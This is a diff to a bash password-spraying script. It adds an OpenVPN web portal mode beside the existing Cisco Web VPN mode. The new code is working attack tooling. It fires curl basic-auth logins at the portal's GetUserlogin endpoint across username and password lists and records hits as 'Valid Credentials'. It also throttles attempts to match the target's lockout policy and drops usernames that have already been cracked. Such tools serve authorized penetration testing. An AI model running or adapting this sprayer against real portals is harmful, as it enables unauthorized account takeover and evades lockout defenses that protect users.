@@ -21,6 +21,10 @@ if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help"
     echo "To password spray an CISCO Web VPN a target portal or server hosting a portal must be provided"
     echo "Useage: spray.sh -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
     echo -e "Example: spray.sh -cicso 192.168.0.1 usernames.txt passwords.txt 1 35\n"
+    
+    echo "To password spray an OpenVPN web portal a target IP address and port must be provided"
+    echo "Useage: spray.sh -ovpn <targetIP> <targetPort> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
+    echo -e "Example: spray.sh -ovpn 192.168.0.1 943 usernames.txt passwords.txt 1 35\n"
 
     echo -e "\nIt is also possible to update the supplied 2016/2017 password list to the current year"
     echo "Useage: spray.sh -passupdate <passwordList>"
@@ -333,6 +337,57 @@ if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
                 echo "Incorrect $u%$password" >> logs/spray-logs.txt
             fi
             rm -f cookies.txt
+        done
+
+        cat logs/spray-logs.txt | grep "Valid Credentials"
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
+        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
+
+        for completeuser in $(cat logs/usernamestoremove.txt); do 
+            sed -i.bak "/$completeuser/d" $userslist
+        done
+        rm logs/usernamestoremove.txt
+        counter=$(($counter + 1))
+        if [ $counter -eq $lockout ] ; then
+            counter=0
+            sleep $lockoutduration
+        fi
+    done
+fi
+
+#OpenVPN Web Portal Password Spraying
+if [ "$1" == "-ovpn" ] || [ "$1" == "--ovpn" ] || [ "$1" == "ovpn" ] ; then
+    mkdir -p logs
+    set +H
+    cp $4 logs/username-removed-successes.txt
+    userslist="logs/username-removed-successes.txt"
+    passwordlist=$5
+    lockout=$6
+    lockoutduration=$(($7 * 60))
+    postrequest=$8
+    counter=0
+    touch logs/spray-logs.txt
+
+    target="https://$(echo $2 | cut -d '/' -f -3):$3"
+    targetpath="$target/rest/GetUserlogin"
+
+    #Then start on list
+    for password in $(cat $passwordlist); do
+        time=$(date +%H:%M:%S)
+        echo "$time Spraying with password: $password"
+
+        for u in $(cat $userslist); do 
+            ovpnlogin=$(curl -k -s -L -u $u:$password $targetpath)
+            
+            if echo $ovpnlogin | grep -q "OpenVPN client config"; then
+                echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
+            else
+                if echo $ovpnlogin | grep -q "LOCKOUT"; then
+                    echo "Account locked out! Try changing password policy setting"
+                    exit
+                fi
+                echo "Incorrect $u%$password" >> logs/spray-logs.txt
+            fi
         done
 
         cat logs/spray-logs.txt | grep "Valid Credentials"
